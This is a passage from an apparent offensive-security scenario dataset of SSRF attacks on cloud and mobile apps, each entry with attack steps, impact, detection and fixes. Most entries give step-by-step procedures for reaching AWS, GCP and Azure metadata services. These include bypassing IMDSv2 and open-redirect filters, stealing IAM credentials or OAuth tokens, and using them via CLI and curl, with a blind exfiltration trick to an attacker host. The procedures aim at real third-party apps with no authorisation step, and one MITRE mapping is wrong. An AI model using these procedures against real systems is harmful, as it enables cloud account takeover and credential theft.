Attack Steps: 1. Find a cloud application that offers a "PDF/image generation from URL" feature (e.g., “generate invoice from web link” or “screenshot URL as PDF”). 2. Open a free account and locate the form where the URL is accepted. 3. First test if the URL is fetched server-side: enter your RequestBin or Interactsh URL. 4. Generate the PDF/image and check your endpoint for any incoming requests. If you get a hit, the server is fetching the URL internally — a potential SSRF. 5. Replace your URL with http://169.254.169.254/latest/meta-data/ to target AWS metadata. 6. Generate the file again. If the app includes metadata in the image or PDF (check file text or use strings filename.pdf), it confirms SSRF. 7. You can try other internal IPs like http://localhost:80 or internal services (http://internal-api.service.local). 8. If you receive reflected credentials or internal service content in the file, download it and extract content (use Notepad or PDF readers). 9. Use any obtained access credentials to validate AWS access via AWS CLI or SDK. 10. If access works, this confirms a successful SSRF via PDF generator with critical cloud impact.
Impact: Leakage of internal cloud data, IAM credentials, access to private services
Detection Method: Monitor PDF/image generation logs for metadata IP access; alert on such fetches
Solution: Disallow access to private/internal IPs; use URL allowlisting; sandbox renderers in separate network contexts
Tags: SSRF, PDF Generator Abuse, Cloud, Metadata Exposure, Remote URL Rendering
Source: Real-world PDF generation tools in cloud apps

Title: Mobile App Cloud Sync Feature (Dropbox/WebDAV)
Scenario Description: Many mobile apps offer features to sync files with cloud storage services like Dropbox, Google Drive, or WebDAV by allowing users to input a custom sync URL. If the backend service accepts this user-controlled URL without proper validation and fetches files directly (server-to-server), then an attacker can abuse this feature to make the server access internal cloud infrastructure or metadata endpoints (e.g., AWS/GCP metadata services), leading to SSRF.
Tools Used: Android Mobile App (Test App), WebDAV test server (Nextcloud or ownCloud), Ngrok, Burp Suite, RequestBin, Interactsh
Attack Steps: Step 1: Identify or download a mobile application that supports cloud sync with user-configurable storage backends (e.g., WebDAV). Examples include note-taking apps, file managers, or photo backup apps. Step 2: Install the app on an Android emulator or real device and explore the settings to find an option like 'Add Custom WebDAV Server' or 'Connect to Dropbox via custom URL'. Step 3: Intercept the app's HTTP traffic using Burp Suite or a proxy. Configure the mobile device to use Burp's proxy, and install the Burp certificate. Step 4: Set up a webhook listener using RequestBin or Interactsh. This will allow you to see incoming requests if the app/backend server fetches the URL. Step 5: In the app, set the cloud sync destination to your webhook listener URL (e.g., http://<your-requestbin-url>). Step 6: Upload a test file using the app’s sync feature. If you receive a request at your webhook listener, it proves the server is fetching the file from your provided URL (indicating SSRF potential). Step 7: Replace the sync URL with an internal target such as http://169.254.169.254/latest/meta-data/ (AWS metadata) or http://localhost:80. Step 8: Attempt to trigger sync again. Step 9: Observe whether the app returns a delay or error (often servers timeout or include a partial response). If the app displays content from the internal URL (like IAM role name, instance ID), it confirms SSRF. Step 10: If metadata credentials (e.g., AccessKeyId, SecretAccessKey) are returned, extract them and use AWS CLI to validate: aws s3 ls --access-key .... Step 11: You now have proven that SSRF is possible via cloud sync misconfiguration in a mobile app. You can go further to exploit internal services if available by changing the sync target. Step 12: Document the app name, backend behavior, and metadata returned, as this confirms a critical vulnerability due to poor validation of sync URLs in mobile-cloud integrated services.
Target Type: Mobile Apps with Cloud Sync Features
Vulnerability: SSRF via Custom Cloud Sync URL
Impact: IAM credential leakage, access to internal services, cloud privilege escalation
Detection Method: Monitor unusual sync URLs or traffic to metadata endpoints like 169.254.169.254; check logs for server-to-server fetch patterns
Solution: Enforce strict allowlist of domains in cloud sync (only Dropbox/Google Drive/WebDAV domains), block access to internal IPs, isolate backend fetchers in private subnets
Tags: SSRF, Cloud Sync Abuse, Mobile App, Metadata Leakage, WebDAV Exploit
Source: Real-World Mobile Apps (open source or third-party test apps with sync features)

Title: Mobile Bug Reporter / Logging Bot (SSRF to Slack or Email)
Scenario Description: Many mobile apps use automated bug reporting services that send error logs to developers via email, Slack, or a custom webhook when a crash or issue occurs. These services often collect crash logs that may include user-generated fields (like bug description or error link). If the backend system embeds links or screenshot URLs into the report without sanitization, and then fetches or screenshots those URLs (server-side), it opens the door to SSRF. Attackers can abuse this to force internal services to be accessed (such as AWS metadata service, local admin panels, etc.).
Tools Used: Burp Suite, Android Emulator, ngrok, Interactsh, RequestBin, Test App with Bug Report Feature
Attack Steps: Step 1: Find a mobile app with a bug report or feedback feature that lets you enter a custom message, crash description, or even upload a screenshot or crash log file. These fields are usually available under “Help,” “Support,” or “Feedback.” Step 2: Monitor the traffic using Burp Suite by configuring your Android device (or emulator) to use Burp as its proxy. Install the Burp certificate on your device to capture HTTPS requests. Step 3: Submit a fake bug report via the app, and include a unique URL inside the message field — e.g., http://your-interactsh-url.com or use ngrok to create a URL like http://your-ngrok-id.ngrok.io. This is to test if the backend bot or system fetches the link you provide. Step 4: Watch your Interactsh or webhook listener to check if any HTTP request is made from the app’s backend system after you submit the bug. If you receive a request, it means the bug reporter or logging bot is accessing the link on the server-side, which confirms SSRF behavior. Step 5: Now replace your harmless link with http://169.254.169.254/latest/meta-data/, which is the internal AWS metadata endpoint. Step 6: Submit the bug report again including this link in a crash description like “app crashes when accessing http://169.254.169.254/latest/meta-data/”. Step 7: Wait and observe. If the backend bot fetches the internal AWS metadata and includes part of it in logs, or leaks info in a reply (some apps send you back a debug summary via email), you will see data like instance-id, hostname, or even IAM credentials in the response or your email. Step 8: If credentials are returned, extract them and validate with AWS CLI: aws configure → enter the credentials → then aws s3 ls to check if access is allowed. Step 9: You have now successfully confirmed an SSRF via the mobile app’s bug reporting feature. If exploited further, this can expose internal cloud infrastructure. Step 10: Document the app name, response logs, metadata leaked, and confirm the vulnerability’s real-world impact — it can be reported via a responsible disclosure or bug bounty if it's a third-party app.
Target Type: Mobile Application with Cloud Logging/Bug Report
Vulnerability: SSRF via User-Controlled URLs in Crash Reporter
Impact: Unauthorized access to AWS metadata, credential theft, lateral movement into internal network
Detection Method: Log analysis of bug reports, alerts on metadata access attempts, external access to internal URLs
Solution: Sanitize and validate user-supplied URLs before server-side access; disallow requests to internal IPs like 169.254.x.x, localhost, 127.0.0.1; isolate bots in zero-trust VPCs
Tags: SSRF, Bug Report Abuse, Slack Bot Exploit, Logging Bot Attack, Metadata Leak
Source: Real-world mobile apps with auto crash logging & integrations (Slack, Mail, Discord)

Title: Open Redirect → SSRF Chain
Scenario Description: In many cloud-based applications, developers attempt to protect SSRF by blocking requests to internal IPs (like 169.254.169.254, localhost, etc.). However, attackers can bypass these protections by chaining SSRF with a trusted open redirect on the same or a whitelisted domain. The SSRF system thinks it’s fetching a safe domain, but due to redirection, it ends up accessing internal cloud resources, allowing full SSRF bypass. This is known as an Open Redirect → SSRF Chain.
Tools Used: Burp Suite, Interactsh, Ngrok, RequestBin, HTTP Toolkit, Test cloud app with SSRF-protected fetcher (e.g., image preview, PDF renderer, etc.)
Attack Steps: Step 1: Identify a cloud web application that fetches user-supplied URLs on the backend — this could be an image fetcher, PDF generator, link previewer, etc. Step 2: Test the application by giving it a harmless public URL (like http://example.com) and verify it successfully loads or renders the content. This confirms server-side fetching is happening. Step 3: Try to give it a known internal IP such as http://169.254.169.254/latest/meta-data/ or http://localhost and see if it blocks the request — if it does, this indicates SSRF protection is enabled (this is good, now we try to bypass it). Step 4: Next, search for an open redirect vulnerability in the same application or in a domain that is whitelisted by the SSRF backend. You can do this by looking for URLs that include parameters like ?url=, ?redirect=, ?next=, etc. For example, a link like https://vulnerable.app/redirect?next=http://example.com might redirect you to the given URL. Step 5: Confirm that the redirect is server-side and not JavaScript-based. Paste the redirect link into your browser — if it immediately redirects you without delay or page load, it's likely server-side. Step 6: Replace the example.com in the redirect URL with the internal target (e.g., http://169.254.169.254/latest/meta-data/) like this: https://vulnerable.app/redirect?next=http://169.254.169.254/latest/meta-data/. Step 7: Now go back to the original SSRF endpoint in the app and submit this full redirect URL as the input — since the backend thinks it's fetching a whitelisted domain (i.e., vulnerable.app), it allows the request. But it gets silently redirected to the metadata URL internally. Step 8: If the application shows output from the metadata service (like instance-id, hostname, iam/security-credentials, etc.), the attack is successful — this proves SSRF was triggered using the open redirect. Step 9: If credentials are returned (like access key ID, secret access key), save them and use the AWS CLI to validate with commands like aws configure and then aws sts get-caller-identity. Step 10: If access is successful, you’ve confirmed a working SSRF chain using an open redirect, bypassing security filters. Step 11: You can further enumerate internal services like http://localhost:8080/admin or internal dashboards by chaining open redirect to those paths as well. Step 12: Log and document all your findings including which redirect was used, what endpoint allowed SSRF, and which internal data you were able to access. This forms a strong vulnerability report with critical security impact.
Target Type: Cloud Web App with SSRF Filter and Redirect Endpoint
Impact: Bypass of SSRF protection, internal metadata theft, possible cloud privilege escalation
Detection Method: Monitor internal IPs being accessed after redirection; detect chained redirects leading to internal endpoints
Solution: Block open redirects entirely or sanitize all input; apply SSRF protections after full redirect resolution, not before; isolate fetchers in zero-trust network zones
Tags: SSRF, Open Redirect, Metadata Exposure, Redirect Chain, Cloud IAM Access
Source: Verified real-world cloud SSRF chaining cases, Bug Bounty writeups (HackerOne, Bugcrowd)

Title: SSRF via PDF/Doc Parser on Uploaded URLs
Scenario Description: Many cloud services and apps allow users to upload documents (PDF, DOCX, etc.) that are later parsed or previewed by the backend server. Some of these services fetch and embed remote content into the document (e.g., images, CSS, or hyperlinks). If the parser fetches external URLs embedded inside a document without sanitizing them, an attacker can insert URLs that point to internal cloud resources (like AWS metadata services or internal dashboards). When the parser tries to fetch those links to render or analyze the document, SSRF occurs.
Tools Used: LibreOffice/MS Word (for editing), Burp Suite, Ngrok, Interactsh, RequestBin, Online doc preview services
Attack Steps: Step 1: Identify a target web app or cloud service that allows uploading of .docx, .pdf, or .odt files and renders them (either for preview, OCR, or indexing). Common platforms are document scanners, cloud storage apps, or online converters. Step 2: On your computer, open Microsoft Word or LibreOffice Writer and create a blank DOCX document. Step 3: Insert a remote image from a URL using “Insert → Picture → From Online → URL” and paste a harmless public URL (e.g., http://your-ngrok-id.ngrok.io/test.png). Save the document. Step 4: Upload this document to the target app. If the backend server tries to render the image, you’ll receive a hit on your ngrok or webhook listener, proving the server is making the request — a sign of possible SSRF. Step 5: Now repeat the process, but instead of a public URL, insert the internal AWS metadata URL as the image source: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Step 6: Save the new file and upload it again to the target app. Step 7: If the app’s document preview fails, returns an error, or hangs for a while — it’s a good sign the internal fetch was attempted. If the app allows downloading the rendered document (e.g., PDF preview), download it and inspect the content. Step 8: Use a text editor or PDF reader to open the output file and look for leaked content like AccessKeyId, SecretAccessKey, Token, or EC2 instance ID. Step 9: If such credentials are found, use AWS CLI to validate them. Run aws configure, paste the keys, then test access using aws s3 ls. If successful, you have confirmed SSRF via document parser. Step 10: You can further insert other internal URLs into the document as image or link references like http://localhost:8080/admin, http://internal-api.local/metrics, etc. and re-upload to see if you can extract more sensitive data. Step 11: Log all proof including the DOCX file, output preview, metadata or credentials leaked, and command output from AWS CLI as evidence of successful exploitation.
Target Type: Cloud-based Document Preview or Parser System
Vulnerability: SSRF via Embedded URL Fetching in Uploaded Docs
Impact: Cloud metadata exposure, internal service enumeration, IAM key leakage
Detection Method: Monitor document processing logs for outgoing requests to private/internal IPs; alert on access to metadata URLs
Solution: Sanitize all URLs in uploaded documents before fetching; isolate preview/rendering systems in sandbox environments; disable automatic URL fetching in doc parsers
Tags: SSRF, Document Parser Exploit, DOCX/PDF SSRF, Metadata Leak, AWS Exploit
Source: Real-world bug bounty reports and lab simulations (OWASP, HackerOne writeups)

Title: SSRF to AWS Metadata (IMDSv1)
Scenario Description: In AWS, every EC2 instance has access to its own metadata through a special internal IP: http://169.254.169.254. This metadata contains sensitive data like IAM roles, credentials, and region info. In IMDSv1, there’s no session token required. If a cloud app has a vulnerable server that performs SSRF (fetches attacker-controlled URLs), and doesn’t block access to internal IPs, an attacker can trick the server into accessing its own metadata and leak credentials, which can then be used to gain full control over AWS resources.
Tools Used: Burp Suite, Interactsh, RequestBin, AWS CLI, Test App with SSRF or any HTTP fetcher (e.g., image loader, PDF URL parser, etc.)
Attack Steps: Step 1: Find a cloud-based web application that allows user input of a URL that the server fetches internally — such as a PDF generator from link, link preview fetcher, or image renderer. Step 2: Set up Burp Suite and intercept the request where the URL is being submitted. Alternatively, use a proxy or browser to send a crafted POST request. Step 3: Test the SSRF by submitting a public webhook URL (Interactsh or RequestBin). If you receive a ping or HTTP request on your webhook endpoint, this confirms the server is making backend HTTP requests based on user input — the app is SSRF vulnerable. Step 4: Now change the submitted URL to: http://169.254.169.254/latest/meta-data/ — this is the AWS EC2 instance metadata service address. If the server is running on an AWS EC2 instance using IMDSv1 and the app has no SSRF protections, it will successfully fetch the metadata. Step 5: Examine the response returned by the application. It may contain a list of available metadata categories like iam/, hostname, instance-id, etc. If this shows up, it proves the SSRF is accessing AWS metadata. Step 6: Next, submit a request to http://169.254.169.254/latest/meta-data/iam/security-credentials/. This returns the name of the IAM role attached to the instance (e.g., AppServerRole). Step 7: Now fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/AppServerRole — this returns the actual IAM credentials in JSON format: AccessKeyId, SecretAccessKey, and Token. Step 8: Open terminal and configure AWS CLI with these credentials: run aws configure, then input the leaked AccessKey, SecretKey, and Token (if required). Step 9: Test the level of access with commands like aws s3 ls, aws ec2 describe-instances, or aws sts get-caller-identity. If you receive output, you’ve successfully exploited IMDSv1 and obtained cloud-level access. Step 10: This can now be used to access AWS services, escalate privileges, extract sensitive data, or pivot further inside the cloud infrastructure. Step 11: Always record the SSRF entry point, the response from each metadata fetch, and the CLI commands executed as proof of exploitation. This type of attack is critical and commonly abused in real-world cloud breaches.
Vulnerability: SSRF to Internal IP (169.254.169.254) → Credential Exposure
MITRE Technique: T1557.000 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning (closest match for metadata capture)
Impact: Full AWS account compromise, S3 access, EC2 control, privilege escalation
Detection Method: Monitor logs for requests to metadata IPs (169.254.169.254); alert on unusual server-to-internal-IP requests
Solution: Disable IMDSv1 and enforce IMDSv2; block all SSRF via firewall or application-level IP filtering; isolate backend fetchers in no-internet subnets
Tags: SSRF, IMDSv1, AWS Metadata, EC2, IAM, Credential Theft, Cloud Exploit
Source: Real AWS Breaches (e.g., Capital One breach), HackerOne/Bugcrowd verified writeups

Title: SSRF Bypass to IMDSv2 (Uses PUT, Custom Headers)
Scenario Description: Amazon EC2 instances use the Instance Metadata Service (IMDS) to provide instance-specific data like IAM role credentials. IMDSv2 was introduced to prevent SSRF by requiring a session token, obtained via a PUT request to a specific path with a custom header (X-aws-ec2-metadata-token-ttl-seconds). Most SSRF filters only allow simple GET requests, so IMDSv2 breaks them. However, if the SSRF endpoint allows methods like PUT and custom headers, an attacker can still obtain a session token and use it to fetch metadata, bypassing IMDSv2 protections.
Tools Used: Burp Suite, HTTP Toolkit, Custom Python script, RequestBin, Interactsh, AWS CLI, Vulnerable app with SSRF allowing PUT/header injection
Attack Steps: Step 1: Identify a web application that allows user-supplied URLs to be fetched by the backend (for example, a PDF generator, image fetcher, webhook tester, etc.). Confirm the app uses SSRF by submitting a controlled public URL (e.g., via Interactsh or RequestBin) and watching for callbacks. Step 2: Confirm whether the application allows SSRF with custom HTTP methods (like PUT) and custom headers. You can do this using Burp Suite or HTTP Toolkit by intercepting a request and modifying it to send a PUT request with a custom header like X-Test: 123. If the server accepts this and processes the request, this is a strong sign that method and header injection is possible. Step 3: Check whether the application is running on AWS and using IMDSv2. You can attempt a direct SSRF to http://169.254.169.254/latest/meta-data/ — if it fails or returns “401 Unauthorized”, it is likely protected by IMDSv2. Step 4: Craft a special request to obtain the IMDSv2 token. This must be a PUT request to http://169.254.169.254/latest/api/token with header: X-aws-ec2-metadata-token-ttl-seconds: 21600. Use Burp or Python code to simulate how the vulnerable app might accept this input. Step 5: If the app accepts this request, it will return a token string. Store this token. Step 6: Use the token to make a GET request to the metadata path — for example, http://169.254.169.254/latest/meta-data/iam/security-credentials/ with the header X-aws-ec2-metadata-token: <token>. Submit this request through the same SSRF channel, either using parameter injection or direct manipulation. Step 7: If successful, you will receive the name of the IAM role. Use it to make another request to http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName> again with the token in the header. Step 8: The response will contain IAM credentials: AccessKeyId, SecretAccessKey, and Token. Step 9: Use AWS CLI to validate these credentials. Open terminal, type aws configure, and enter the leaked credentials. Then run aws sts get-caller-identity or aws s3 ls to check for permissions. If access is successful, this confirms that you’ve bypassed IMDSv2 using advanced SSRF techniques. Step 10: Document everything — confirm the SSRF endpoint accepts PUT, custom headers, the response from IMDSv2, and the working AWS commands. This is a critical cloud exploit.
Target Type: AWS EC2-based Web App with Weak SSRF Filtering
Impact: Access to full IAM credentials from EC2 instance, leading to AWS privilege escalation and data theft
Detection Method: Monitor server requests with custom HTTP methods to metadata IP, alert on unusual PUT requests or token header usage
Solution: Block server-side access to 169.254.169.254 from web apps entirely; enforce strong SSRF validation; isolate HTTP fetchers from instance metadata; validate methods and headers
Tags: SSRF, IMDSv2, Metadata Bypass, AWS Token Hijack, Cloud Privilege Escalation
Source: Verified in AWS IMDSv2 documentation, BlackHat research, and bug bounty reports

Title: Blind SSRF to Metadata
Scenario Description: In some cloud applications, SSRF vulnerabilities do not return any response to the attacker (no output). This is called Blind SSRF. Even though you don’t see the server’s response, it might still be making internal requests on your behalf. If the backend is hosted on AWS EC2 with IMDSv1 enabled and no SSRF protections, you can exploit Blind SSRF to access 169.254.169.254 (AWS metadata IP). Using DNS logging or exfil tricks, you can still leak sensitive metadata like IAM credentials. This is especially useful in real-world bug bounty and black-box cloud pentesting.
Tools Used: Burp Suite, Interactsh, RequestBin, Ngrok, AWS CLI, Python HTTP server, Test cloud app with SSRF vulnerable input
Attack Steps: Step 1: Find a cloud-based web app (hosted on AWS EC2) that accepts user-controlled URLs and tries to fetch them server-side — like image preview, link renderer, file fetcher, or PDF generator. Step 2: Intercept the request where the app accepts a URL using Burp Suite. Submit your own test URL like http://your-interactsh-id.oast.live/ssrf-test.png or a Ngrok link to check whether the server calls your endpoint. Step 3: If you receive a request on Interactsh or your webhook listener, you’ve confirmed the app is SSRF vulnerable — but may be blind (no response in UI). Step 4: Now submit the metadata URL in your SSRF input: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Since it's blind, the app likely won't return anything, but the server might have fetched it. Step 5: To exfiltrate metadata blindly, use a trick: Create a DNS name that you control (via Interactsh or Burp Collaborator) and embed that as part of the SSRF URL. Example: http://169.254.169.254/latest/meta-data/iam/security-credentials/?q=<your-subdomain>.oast.live. If the metadata service appends anything after ?q=, it might make a DNS request to your domain when parsing — and you will receive a DNS log hit. Step 6: Another trick is to host a Python HTTP server (python3 -m http.server 8000) and encode the IAM credentials as part of the request path, like: http://<your-server>/leak?data=<value>. Embed that full URL in SSRF payloads. If credentials are ever passed or fetched and redirected to your controlled domain, they will show up in logs. Step 7: If you suspect the app fetches and logs metadata internally (to Slack, email, dashboard), try inserting a payload that forces an error — e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/invalid and watch if logs or messages return anything useful. Step 8: Once any part of metadata leaks (especially IAM Role name), try brute-forcing or fuzzing URLs like /latest/meta-data/iam/security-credentials/RoleName to trigger further SSRF requests via redirect or internal retry logic. Step 9: If you ever successfully leak AccessKeyId, SecretAccessKey, and Token, run aws configure on your terminal and test it with aws s3 ls or aws sts get-caller-identity. Step 10: Always document your steps, especially request URLs, proof of DNS hits, SSRF payloads submitted, and metadata values retrieved. Even blind SSRF with metadata access is a critical cloud vulnerability.
Target Type: AWS-hosted EC2 App with SSRF Filtered Output
Impact: Full IAM credential theft, S3 access, cloud takeover without any output shown
Detection Method: DNS logging of metadata fetch attempts, alert on internal IP access from app traffic
Solution: Block all access to 169.254.169.254; switch from IMDSv1 to IMDSv2; prevent apps from processing user-controlled URLs; isolate metadata via network policies
Tags: Blind SSRF, IMDSv1, Metadata Leak, DNS Exfiltration, AWS Credential Theft
Source: Bug Bounty writeups, IMDSv1 AWS docs, HackerOne/PortSwigger research

Title: IMDS Exploit via PDF Renderer / Image Parser
Scenario Description: Many cloud-based applications let users upload documents (PDFs) or images, which are processed by backend services running on cloud VMs (like AWS EC2). If these backend systems automatically fetch external resources inside the PDF (such as remote images, stylesheets, or fonts), and if the parser doesn't restrict internal requests, an attacker can inject a reference to the AWS metadata endpoint (169.254.169.254). When the server tries to fetch this link, it leaks sensitive instance metadata (e.g., IAM credentials). This is a powerful SSRF-based IMDS exploit triggered by document/image parsing.
Tools Used: LibreOffice Writer / Microsoft Word, Burp Suite, AWS CLI, Ngrok, Interactsh, Python HTTP Server, Online PDF Preview Tools, Cloud App accepting PDF/image uploads
Attack Steps: Step 1: Find a cloud web application that allows uploading and previewing PDF files or image documents (e.g., resume upload, ticketing system, document converter, or invoice scanner). These often render the files in the backend using PDF/image parsing libraries. Step 2: Open LibreOffice Writer or Microsoft Word. Insert an external image using Insert > Picture > From File > Link or HTML injection. Use a remote URL for testing like http://your-ngrok-id.ngrok.io/test.png. Save the file as .docx or .pdf. Step 3: Upload the file to the target application. Watch your Ngrok/Interactsh endpoint to see if the server made a request for the image. If yes, it proves the backend fetches embedded URLs while parsing. Step 4: Now replace the remote image or resource link inside the document with http://169.254.169.254/latest/meta-data/iam/security-credentials/ or the base path /latest/meta-data/. You can do this by inserting a linked image pointing to that URL or adding an inside the document’s HTML (if supported). Step 5: Save and upload this modified file to the same application. Step 6: If the backend fetcher is not protected and IMDSv1 is active, the server will request metadata and may leak its contents by embedding the fetched data in the rendered output (PDF preview or email log). Step 7: If the output is downloadable, download the generated preview or processed PDF. Open it with a text editor or PDF reader and search for keywords like AccessKeyId, SecretAccessKey, Token, role-name, etc. Step 8: If you find IAM credentials, copy them into AWS CLI using aws configure, and verify access using commands like aws sts get-caller-identity or aws s3 ls. Step 9: If credentials are valid, you’ve successfully exploited IMDS via the PDF renderer/image parser. Step 10: If the app does not let you download the rendered output, you can still attempt Blind SSRF exfiltration by crafting a metadata request with a redirect to your domain, e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/?x=http://your-domain.com. If the metadata service follows redirects (depends on library), it may leak content via DNS. Step 11: Document all inputs, PDF structure, metadata URLs used, the response document, and the AWS CLI output. This is a real-world, high-impact cloud metadata leakage via document/image processing systems.
Target Type: Cloud document processors, image parsers on AWS EC2
Vulnerability: SSRF to IMDS via embedded remote resource
Impact: Full AWS IAM credential theft, S3 access, cloud control, privilege escalation
Detection Method: Monitor internal requests from backend to 169.254.169.254, review outbound requests triggered by document parsing
Solution: Restrict network access from backend renderers to internal metadata IPs; switch to IMDSv2; use egress firewall rules; disable auto-fetching of remote resources
Tags: IMDSv1, SSRF, Document Parser, Image Renderer, Metadata Leak, AWS Exploit
Source: AWS IMDSv1 docs, bug bounty case studies, HackerOne and PortSwigger labs

Title: GCP Metadata Exploit via SSRF
Scenario Description: In Google Cloud Platform (GCP), every Compute Engine VM instance has a metadata server located at the internal IP address 169.254.169.254. This server provides sensitive information like service account access tokens, SSH keys, and project metadata. If a cloud application running on a GCP VM has a Server-Side Request Forgery (SSRF) vulnerability and the server does not block internal requests, an attacker can abuse the SSRF to access internal GCP metadata and steal access tokens. These tokens can be used to call GCP APIs with the same permissions as the server — such as accessing storage buckets, secrets, databases, and more. This is one of the most dangerous real-world GCP cloud security issues.
Tools Used: Burp Suite, Interactsh/RequestBin, HTTP Toolkit, GCP CLI (gcloud), Python requests, Vulnerable GCP-hosted web app with SSRF
Attack Steps: Step 1: Identify a web application deployed on Google Cloud that fetches external URLs or accepts URLs from the user, like file importers, image preview tools, or link validators. These endpoints often use SSRF internally. Step 2: Test the SSRF by submitting a public URL you control, like http://your-subdomain.interactsh.com. If the server calls your domain, SSRF is confirmed. Step 3: Change your test URL to http://169.254.169.254/ — this is the internal IP of the GCP metadata server. If the app is vulnerable and the server doesn't block internal IPs, this request may go through. Step 4: The metadata server on GCP requires a special request header: Metadata-Flavor: Google. Without this, access is denied. So, your next goal is to check if the SSRF endpoint allows you to set custom headers or modify the method (like POST/GET). If it does, add the header and make a request to http://169.254.169.254/computeMetadata/v1/instance/ with Metadata-Flavor: Google. Step 5: If successful, you'll get instance metadata like VM ID, hostname, zone, etc. Now, access the sensitive token path: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token. Make the SSRF request with the header Metadata-Flavor: Google and observe if the response contains an access token. Step 6: If the SSRF is blind (no output shown), try DNS exfiltration — append a redirect or query string like ?x=http://<your-collaborator>.oast.live or encode the metadata endpoint in a redirect chain. Some apps log responses or send previews back via email or Slack. Step 7: If you successfully retrieve an access token (format: JSON with access_token, expires_in, and token_type), use the GCP CLI to test it: run gcloud auth activate-refresh-token or use curl to test access, like curl -H "Authorization: Bearer <token>" https://www.googleapis.com/oauth2/v1/userinfo. Step 8: Use the token to explore what access the service account has — for example, try listing storage buckets (curl -H "Authorization: Bearer <token>" https://storage.googleapis.com/storage/v1/b). Step 9: If successful, you've just performed a real-world metadata-based SSRF attack on GCP — stealing cloud credentials without needing direct access to the system. Step 10: Document all SSRF payloads, request headers, metadata responses, and token-based GCP CLI/API usage to fully demonstrate the exploit.
Target Type: GCP-hosted VM running a cloud web app
MITRE Technique: T1552.001 – Credentials in Files (Cloud metadata theft variant)
Impact: Full GCP access token theft; access to storage, secrets, APIs; project compromise
Detection Method: Monitor outgoing requests to metadata IPs; alert on requests containing Metadata-Flavor: Google header; check logs for SSRF-like behavior
Solution: Block internal IPs at firewall level, disable metadata API access for apps, enforce metadata concealment policies, validate SSRF inputs and headers
Tags: GCP, Metadata, SSRF, OAuth Token Leak, Cloud Token Theft, Service Account Abuse
Source: Google Cloud Docs, Bug Bounty Reports (HackerOne), OWASP Cloud SSRF Research

Title: Azure Metadata SSRF Exploit
Scenario Description: Azure Virtual Machines (VMs) provide an internal metadata server that exposes sensitive information about the VM instance and access tokens. This server is located at a fixed IP address: http://169.254.169.254/metadata/. An attacker can exploit a vulnerable cloud web application hosted on Azure if it has a Server-Side Request Forgery (SSRF) vulnerability and the backend is not protected properly. Using the SSRF, the attacker can force the server to access the internal metadata URL, obtain access tokens and VM info, and use them to interact with Azure resources. This attack is very real and widely abused when cloud-based services allow open URL input or internal fetches.
Tools Used: Burp Suite, Interactsh, Ngrok, GCP/Azure CLI, Python Requests, SSRF-vulnerable Azure Web App
Attack Steps: Step 1: Find an Azure-hosted web application that allows users to input URLs which are fetched by the backend — examples include PDF/image fetchers, link preview generators, or webhook testers. These often process URLs in the backend. Step 2: Test if the application is vulnerable to SSRF by submitting a test URL you control, such as one from Interactsh (http://your-id.oast.live) or a temporary Ngrok HTTP endpoint (http://xyz.ngrok.io). If your listener receives the request, SSRF is confirmed. Step 3: Next, test whether you can reach internal IPs. Submit the special Azure metadata IP: http://169.254.169.254/metadata/instance?api-version=2021-02-01. Azure metadata service requires a special header to be set: Metadata: true. Step 4: If the vulnerable app allows custom headers in the SSRF request (or you can trick it via redirection or caching), add the header Metadata: true along with the request. This is often possible using advanced SSRF where the server uses tools like curl, requests, or fetch. Step 5: If successful, the response will contain JSON data about the instance: vmId, location, subscriptionId, and compute details. Step 6: The real goal is to get access tokens. Make another SSRF request to this path: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/. This path returns an OAuth2 token if successful. Again, ensure the Metadata: true header is sent. Step 7: If the SSRF endpoint returns the token in the output, copy the value of access_token. Step 8: Open a terminal and test the token by using the Azure CLI or with curl: curl -H "Authorization: Bearer <access_token>" https://management.azure.com/subscriptions?api-version=2020-01-01. If you get a list of subscriptions or resource groups, you’ve confirmed a successful exploit. Step 9: You can now use this token to access other Azure APIs like Key Vault, Storage, or even Virtual Machines — depending on the permissions of the managed identity assigned to the VM. Step 10: Document all payloads you used, SSRF response results, and Azure API calls you made using the stolen token. This is a real and impactful cloud attack vector used in actual breaches.
Target Type: Azure-hosted Web App running on Azure VM
MITRE Technique: T1552.001 – Credentials in Files (Token Access via Metadata)
Impact: Theft of Azure OAuth2 tokens → unauthorized access to Azure services like Key Vault, Storage, Compute
Detection Method: Monitor outgoing HTTP traffic to 169.254.169.254, inspect logs for Metadata: true header in outbound traffic
Solution: Block access to metadata IP from web applications using network security groups (NSGs), enforce identity restrictions, reject user-supplied URLs server-side, validate SSRF filters
Tags: Azure, Metadata, SSRF, Managed Identity, OAuth2 Token, Cloud Exploit
Source: Microsoft Azure Docs, Real Bug Bounty Reports (HackerOne, Bugcrowd), PortSwigger Labs

Title: Exploiting IMDS via Open SSH/RDP
Attack Type: Misconfigured Network Exposure + Cloud Metadata Service Exploitation
Scenario Description: A cloud VM (e.g., AWS EC2, GCP Compute, Azure VM) has SSH or RDP ports (22/3389) publicly accessible. Attacker brute forces or reuses leaked credentials to gain access, then queries IMDS (Instance Metadata Service) to extract temporary credentials (IAM roles) for further exploitation.
Tools Used: Nmap, Hydra, curl (or PowerShell for Windows), SSH client, EC2 instance
